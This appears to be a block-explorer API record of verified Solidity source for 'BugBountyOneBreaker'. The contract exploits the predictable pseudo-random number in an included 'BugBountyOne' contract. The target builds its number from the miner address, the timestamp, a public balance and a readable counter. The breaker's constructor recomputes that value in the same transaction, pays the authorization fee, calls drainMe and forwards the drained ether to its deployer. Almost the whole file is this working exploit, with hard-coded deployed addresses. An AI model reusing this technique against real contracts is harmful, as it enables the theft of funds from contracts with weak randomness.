{"status":"1","message":"OK","result":[{"SourceCode":"/**\r\n___________    _________        .____________  ____  __.\r\n\\__    ___/___ \\_   ___ \\  _____|   \\_   ___ \\|    |/ _|\r\n  |    | /  _ \\/    \\  \\/ /  ___/   /    \\  \\/|      <  \r\n  |    |(  <_> )     \\____\\___ \\|   \\     \\___|    |  \\ \r\n  |____| \\____/ \\______  /____  >___|\\______  /____|__ \\\r\n                       \\/     \\/            \\/        \\/\r\n*/\r\n\r\npragma solidity ^0.4.21;\r\n\r\ncontract BugBountyOneBreaker {\r\n\tfunction BugBountyOneBreaker() public payable {\r\n\t    secretHolder s = secretHolder(0x7C4932FccC78d5d9e0E04AB65532c4eA20357890);\r\n        BugBountyOne bb = BugBountyOne(0x976Ec8136C990751410108e4B3f57d65183D80EA);\r\n\t    \r\n\t    uint secret = s.getSecret()+1;\r\n\t    uint guess = _prand(secret);\r\n\t    bb.authorizeAddress.value(10 finney)(this);\r\n\t    bb.drainMe.value(1 finney)(guess);\r\n\t    msg.sender.transfer(address(this).balance);\r\n\t}\r\n\r\n    function _prand(uint s) private returns (uint) {\r\n        address CryptoKitties = 0x06012c8cf97BEaD5deAe237070F9587f8E7A266d;\r\n        \r\n        uint seed1 = s;\r\n        uint seed2 = uint(block.coinbase); // Get Miner's Address\r\n        uint seed3 = now; // Get the timestamp\r\n        uint seed4 = CryptoKitties.balance;\r\n        uint rand = uint(keccak256(seed1, seed2, seed3, seed4));\r\n\t    return rand;\r\n    }\r\n}\r\n\r\ncontract secretHolder {\r\n    uint secret;\r\n    function getSecret() public view returns(uint) {\r\n        return secret++;\r\n    }\r\n}\r\n\r\ncontract BugBountyOne {\r\n\r\n    mapping(address => bool) public authorizedToDrain;\r\n    mapping(address => bool) public notAllowedToDrain;\r\n    address public TechnicalRise; // TechnicalRise is not allowed to drain\r\n    address public CryptoKitties = 0x06012c8cf97BEaD5deAe237070F9587f8E7A266d;\r\n    uint private secretSeed;\r\n    secretHolder private s = new secretHolder();\r\n\r\n\tfunction BugBountyOne() public {\r\n\t    TechnicalRise = msg.sender;\r\n\t    notAllowedToDrain[TechnicalRise] = true;\r\n\t    secretSeed = uint(keccak256(now, block.coinbase));\r\n\t}\r\n\t\r\n\tfunction drainMe(uint _guess) public payable {\r\n        if(notAllowedToDrain[msg.sender]) return;\r\n\r\n        if(authorizedToDrain[msg.sender] && msg.value >= 1 finney && _guess == _prand()) {\r\n            TechnicalRise.transfer(address(this).balance / 20);\r\n            msg.sender.transfer(address(this).balance);\r\n            notAllowedToDrain[msg.sender] = true;\r\n        }\r\n    }\r\n    \r\n    function _prand() private returns (uint) {\r\n        uint seed1 = s.getSecret();\r\n        uint seed2 = uint(block.coinbase); // Get Miner's Address\r\n        uint seed3 = now; // Get the timestamp\r\n        uint seed4 = CryptoKitties.balance;\r\n        uint rand = uint(keccak256(seed1, seed2, seed3, seed4));\r\n        seed1 = secretSeed;\r\n\t    return rand;\r\n    }\r\n    \r\n    function authorizeAddress(address _addr) public payable {\r\n        if(msg.value >= 10 finney) {\r\n            authorizedToDrain[_addr] = true;\r\n        }\r\n    }\r\n    \r\n    function () public payable {\r\n        if(msg.value >= 10 finney) {\r\n            authorizedToDrain[msg.sender] = true;\r\n        }\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"}]","ContractName":"BugBountyOneBreaker","CompilerVersion":"v0.4.21+commit.dfe3193c","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://62871e37e662b3cf78bc23b809858a293bbe890cd140c58ebd990b3fa1e8be72"}]}